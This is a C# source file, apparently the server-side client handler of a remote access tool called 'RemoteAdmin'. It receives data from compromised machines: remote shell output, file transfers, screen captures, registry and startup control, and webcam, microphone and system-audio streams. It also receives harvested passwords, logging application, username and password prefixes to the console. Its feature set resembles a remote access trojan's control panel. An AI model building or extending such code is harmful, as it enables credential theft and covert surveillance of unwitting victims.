using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Threading;
using RemoteAdmin.Shared;


namespace RemoteAdmin.Server.Networking
{
    public class ClientHandler
    {
        private readonly ObservableCollection<ConnectedClient> _clients;
        private readonly Dispatcher _dispatcher;
        private readonly Action _updateClientCount;

        public ClientHandler(
            ObservableCollection<ConnectedClient> clients,
            Dispatcher dispatcher,
            Action updateClientCount)
        {
            _clients = clients;
            _dispatcher = dispatcher;
            _updateClientCount = updateClientCount;
        }

        public async Task HandleAsync(TcpClient tcpClient, SslStream stream)
        {
            ConnectedClient? client = null;

            try
            {
                var message = await NetworkHelper.ReceiveMessageAsync(stream);

                if (message is ClientInfoMessage clientInfo)
                {
                    client = new ConnectedClient
                    {
                        Id = Guid.NewGuid().ToString(),
                        ComputerName = clientInfo.ComputerName,
                        Username = clientInfo.Username,
                        OSVersion = clientInfo.OSVersion,
                        IPAddress = clientInfo.IPAddress,
                        PublicIP = clientInfo.PublicIP,
                        Status = "Online",
                        LastSeen = DateTime.Now,
                        Connection = tcpClient,
                        AccountType = clientInfo.AccountType,
                        Stream = stream
                    };

                    _dispatcher.Invoke(() =>
                    {
                        _clients.Add(client);
                        _updateClientCount();
                    });

                    while (tcpClient.Connected)
                    {
                        var msg = await NetworkHelper.ReceiveMessageAsync(stream);
                        if (msg == null) break;

                        if (msg is HeartbeatMessage)
                        {
                            _dispatcher.Invoke(() => client.LastSeen = DateTime.Now);
                        }
                        else if (msg is ShellOutputMessage shellOutput)
                        {
                            _dispatcher.Invoke(() => client.ShellWindow?.AppendOutput(shellOutput.Output));
                        }
                        else if (msg is ProcessListResponseMessage processListResponse)
                        {
                            _dispatcher.Invoke(() => client.TaskManagerWindow?.UpdateProcessList(processListResponse.Processes));
                        }
                        else if (msg is ServiceListResponseMessage serviceListResponse)
                        {
                            _dispatcher.Invoke(() => client.TaskManagerWindow?.UpdateServiceList(serviceListResponse.Services));
                        }
                        else if (msg is OperationResultMessage operationResult)
                        {
                            _dispatcher.Invoke(() =>
                            {
                                if (!operationResult.Success)
                                {
                                    System.Windows.MessageBox.Show(
                                        operationResult.Message,
                                        "Operation Failed",
                                        System.Windows.MessageBoxButton.OK,
                                        System.Windows.MessageBoxImage.Error);
                                }
                            });
                        }
                        else if (msg is DirectoryListResponseMessage dirResponse)
                        {
                            _dispatcher.Invoke(() => client.FileManagerWindow?.UpdateDirectoryListing(dirResponse));
                        }
                        else if (msg is FileChunkMessage fileChunk)
                        {
                            _dispatcher.Invoke(() => client.FileManagerWindow?.HandleFileChunk(fileChunk));
                        }
                        else if (msg is FolderStructureMessage folderStructure)
                        {
                            Console.WriteLine($"Received folder structure: {folderStructure.FolderName} with {folderStructure.TotalFiles} files");
                            _dispatcher.Invoke(() => client.FileManagerWindow?.HandleFolderStructure(folderStructure));
                        }
                        else if (msg is FolderFileChunkMessage folderFileChunk)
                        {
                            _dispatcher.Invoke(() => client.FileManagerWindow?.HandleFolderFileChunk(folderFileChunk));
                        }
                        else if (msg is ScreenFrameMessage screenFrame)
                        {
                            _dispatcher.Invoke(() => client.RemoteDesktopWindow?.UpdateScreen(
                                screenFrame.ImageData, screenFrame.Width, screenFrame.Height));
                        }
                        else if (msg is WebsiteVisitResultMessage websiteResult)
                        {
                            _dispatcher.Invoke(() =>
                            {
                                string icon = websiteResult.Success ? "✓" : "✗";
                                string title = websiteResult.Success ? "Success" : "Failed";
                                System.Windows.MessageBox.Show(
                                    $"{icon} {websiteResult.Message}\n\nURL: {websiteResult.Url}",
                                    $"Website Visit {title}",
                                    System.Windows.MessageBoxButton.OK,
                                    websiteResult.Success
                                        ? System.Windows.MessageBoxImage.Information
                                        : System.Windows.MessageBoxImage.Error);
                            });
                        }
                        else if (msg is MonitorInfoMessage monitorInfo)
                        {
                            Console.WriteLine($"Received monitor info: {monitorInfo.Monitors.Count} monitors");
                            _dispatcher.Invoke(() =>
                            {
                                client.RemoteDesktopWindow?.UpdateMonitorList(monitorInfo.Monitors);
                            });
                        }
                        else if (msg is RegistryDataMessage registryData)
                        {
                            Console.WriteLine($"Received registry data: {registryData.SubKeys.Count} keys, {registryData.Values.Count} values");
                            _dispatcher.Invoke(() => client.RegistryEditorWindow?.UpdateRegistryData(registryData));
                        }
                        else if (msg is RegistryOperationResultMessage registryOperationResult)
                        {
                            Console.WriteLine($"Received registry operation result: {registryOperationResult.Operation} - {registryOperationResult.Success}");
                            _dispatcher.Invoke(() => client.RegistryEditorWindow?.HandleOperationResult(registryOperationResult));
                        }
                        else if (msg is GetStartupItemsResponseMessage startupItemsResponse)
                        {
                            Console.WriteLine($"Received startup items response: {startupItemsResponse.StartupItems.Count} items");
                            _dispatcher.Invoke(() => client.StartupManagerWindow?.UpdateStartupItemsList(startupItemsResponse.StartupItems));
                        }
                        else if (msg is StartupItemOperationResponseMessage startupOpResponse)
                        {
                            Console.WriteLine($"Received startup operation result: {startupOpResponse.Success}");
                            _dispatcher.Invoke(() => client.StartupManagerWindow?.HandleOperationResult(startupOpResponse));
                        }
                        else if (msg is GetSystemInfoResponseMessage sysInfoResponse)
                        {
                            Console.WriteLine($"Received system info response: {sysInfoResponse.SystemInfo.Count} items");
                            _dispatcher.Invoke(() => client.SystemInformationWindow?.UpdateSystemInformationList(sysInfoResponse.SystemInfo));
                        }
                        else if (msg is GetScheduledTasksResponseMessage tasksResponse)
                        {
                            Console.WriteLine($"Received scheduled tasks response: {tasksResponse.Tasks.Count} tasks");
                            _dispatcher.Invoke(() => client.TaskSchedulerWindow?.UpdateTasksList(tasksResponse.Tasks));
                        }
                        else if (msg is ScheduledTaskOperationResponseMessage taskOpResponse)
                        {
                            Console.WriteLine($"Received task operation result: {taskOpResponse.Success}");
                            _dispatcher.Invoke(() => client.TaskSchedulerWindow?.HandleOperationResult(taskOpResponse));
                        }
                        else if (msg is ExportScheduledTaskResponseMessage exportResponse)
                        {
                            Console.WriteLine($"Received task export result: {exportResponse.Success}");
                            _dispatcher.Invoke(() => client.TaskSchedulerWindow?.HandleExportResult(exportResponse));
                        }
                        else if (msg is PasswordRecoveryResponseMessage passwordResponse)
                        {
                            Console.WriteLine($"");
                            Console.WriteLine($"╔══════════════════════════════════════════════════════════════╗");
                            Console.WriteLine($"║         PASSWORD RECOVERY RESPONSE RECEIVED                  ║");
                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
                            Console.WriteLine($"");
                            Console.WriteLine($"[Server] Success: {passwordResponse.Success}");
                            Console.WriteLine($"[Server] Accounts Count: {passwordResponse.Accounts?.Count ?? 0}");
                            Console.WriteLine($"[Server] Window Exists: {client.PasswordRecoveryWindow != null}");
                            Console.WriteLine($"");

                            if (passwordResponse.Accounts != null && passwordResponse.Accounts.Count > 0)
                            {
                                Console.WriteLine($"[Server] First 5 passwords for verification:");
                                for (int i = 0; i < Math.Min(5, passwordResponse.Accounts.Count); i++)
                                {
                                    var acc = passwordResponse.Accounts[i];
                                    string passPreview = string.IsNullOrEmpty(acc.Password)
                                        ? "[EMPTY]"
                                        : acc.Password.Substring(0, Math.Min(6, acc.Password.Length)) + "...";
                                    Console.WriteLine($"[Server]   [{i + 1}] {acc.Application} | {acc.Username} | {passPreview}");
                                }
                                Console.WriteLine($"");
                            }

                            _dispatcher.Invoke(() =>
                            {
                                Console.WriteLine($"[Server] → Dispatching to UI thread...");

                                if (passwordResponse.Success && passwordResponse.Accounts != null && passwordResponse.Accounts.Count > 0)
                                {
                                    if (client.PasswordRecoveryWindow != null)
                                    {
                                        Console.WriteLine($"[Server] → Updating existing window...");
                                        try
                                        {
                                            client.PasswordRecoveryWindow.UpdatePasswordList(passwordResponse.Accounts);
                                            Console.WriteLine($"[Server] ✓ Window updated successfully with {passwordResponse.Accounts.Count} accounts!");
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine($"[Server] ✗ Error updating window: {ex.Message}");
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine($"[Server] ✗ Window is NULL! Creating new window...");
                                        try
                                        {
                                            var window = new Passwordrecoverywindow(client);
                                            window.Show();
                                            window.UpdatePasswordList(passwordResponse.Accounts);
                                            Console.WriteLine($"[Server] ✓ New window created with {passwordResponse.Accounts.Count} accounts!");
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine($"[Server] ✗ Error creating window: {ex.Message}");
                                        }
                                    }
                                }
                                else if (!passwordResponse.Success)
                                {
                                    Console.WriteLine($"[Server] ✗ Password recovery failed: {passwordResponse.ErrorMessage}");
                                    System.Windows.MessageBox.Show(
                                        $"Password recovery failed: {passwordResponse.ErrorMessage}",
                                        "Password Recovery Error",
                                        System.Windows.MessageBoxButton.OK,
                                        System.Windows.MessageBoxImage.Error);
                                }
                                else
                                {
                                    Console.WriteLine($"[Server] ⚠ No accounts found or empty account list");
                                }
                            });

                            Console.WriteLine($"");
                            Console.WriteLine($"╚══════════════════════════════════════════════════════════════╝");
                            Console.WriteLine($"");
                        }
                        else if (msg is WebcamFrameMessage webcamFrame)
                        {
                            _dispatcher.Invoke(() => client.WebcamViewerWindow?.UpdateWebcamFrame(
                                webcamFrame.ImageData,
                                webcamFrame.Width,
                                webcamFrame.Height,
                                webcamFrame.FrameNumber));
                        }
                        else if (msg is WebcamListMessage webcamList)
                        {
                            Console.WriteLine($"Received webcam list: {webcamList.Cameras.Length} cameras");
                            _dispatcher.Invoke(() => client.WebcamViewerWindow?.UpdateWebcamList(webcamList.Cameras));
                        }
                        else if (msg is AudioChunkMessage audioChunk)
                        {
                            _dispatcher.Invoke(() =>
                            {
                                if (audioChunk.SourceType == AudioSourceType.Microphone)
                                {
                                    client.AudioMonitorWindow?.PlayMicrophoneAudio(audioChunk);
                                }
                                else if (audioChunk.SourceType == AudioSourceType.SystemAudio)
                                {
                                    client.AudioMonitorWindow?.PlaySystemAudio(audioChunk);
                                }
                            });
                        }

                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Client handler error: {ex.Message}");
            }
            finally
            {
                if (client != null)
                {
                    _dispatcher.Invoke(() =>
                    {
                        client.Status = "Offline";
                        _clients.Remove(client);
                        _updateClientCount();
                    });
                }
                try { stream?.Dispose(); } catch { }
                try { tcpClient?.Close(); } catch { }
            }
        }
    }
}